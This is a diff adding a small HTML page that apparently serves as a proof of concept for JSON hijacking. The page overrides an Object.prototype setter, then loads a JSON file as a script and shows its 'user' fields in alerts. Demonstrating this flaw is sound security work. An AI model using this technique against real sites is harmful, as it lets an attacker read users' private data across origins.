@@ -1,0 +1,13 @@
+<html>
+<head>
+<script>
+Object.prototype.__defineSetter__('user', function(obj) {
+  for(var i in obj) {
+    alert(i + '=' + obj[i]);
+  }
+});
+</script>
+<script src="../data/vuln-object.json"></script>
+</head>
+<body></body>
+</html>
